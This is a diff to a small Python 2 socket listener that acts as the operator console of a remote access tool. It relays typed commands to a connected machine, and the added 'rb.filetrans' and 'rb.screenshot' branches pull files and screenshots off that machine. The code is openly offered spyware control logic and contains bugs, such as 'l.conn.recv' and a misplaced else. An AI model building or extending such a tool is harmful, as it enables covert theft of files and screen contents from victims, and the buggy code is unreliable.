@@ -1,4 +1,5 @@
 import socket
+from random import randint
 
 HOST = ""
 PORT = 1234
@@ -27,10 +28,33 @@ try:
         s.listen(1)
         conn, addr = s.accept()
         cmd = raw_input()
-        conn.send(cmd)
 
-        data = conn.recv(2048)
-        print str(data)
+        if "rb.filetrans" in cmd:
+            fn = raw_input("File name: ")
+            f = open(fn, "wb")
+            l = raw_input("Target file address: ")
+            conn.send("rb.filetrans " + fn + " " + l)
+            l = conn.recv(1024)
+            while (l):
+                print "Receiving..."
+                f.write(l)
+                l = conn.recv(1024)
+            f.close()
+
+        if "rb.screenshot" in cmd:
+            fn = string = "scrsht_" + str(randint(1000,9999)) + ".png"
+            f = open(fn, "wb")
+            conn.send("rb.screenshot")
+            l.conn.recv(1024)
+            while(l):
+                print "Receiving..."
+                f.write(l)
+                l = conn.recv(1024)
+
+        else:
+            conn.send(cmd)
+            data = conn.recv(2048)
+            print str(data)
 
 except ValueError:
     "[-] something went wrong"
